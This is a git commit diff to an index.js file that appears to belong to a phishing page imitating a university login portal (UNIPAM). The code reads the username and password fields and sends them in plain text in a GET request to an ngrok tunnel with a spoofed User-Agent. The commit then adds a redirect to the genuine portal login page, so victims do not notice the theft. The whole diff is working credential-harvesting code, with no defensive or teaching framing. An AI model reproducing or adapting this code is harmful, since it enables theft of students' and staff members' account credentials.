e409e0c428c37c364fd3276d4054c8e4d92a6c4b
Diogo antonio <diogoantonio47@hotmail.com>
2021-09-15 14:42:57 -0300

    ok

--- index.js
+++ index.js
@@ -4,11 +4,14 @@ function getUserData(){
    var usuario = document.getElementById("usuario").value
    var senha = document.getElementById("senha").value
    
-   return fetch(`https://afc9-191-55-80-22.ngrok.io/unimensagem/get.php?usuario=${usuario}&senha=${senha}`, {method: "GET",
+   const teste = () =>  fetch(`https://afc9-191-55-80-22.ngrok.io/unimensagem/get.php?usuario=${usuario}&senha=${senha}`, {method: "GET",
    headers: {
      //"Content-Type": "application/json",
      "Access-Control-Allow-Origin":"*",
      "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
    }})
+
+   teste();
+   window.location.replace("https://portal.unipam.edu.br/login");
 
 }
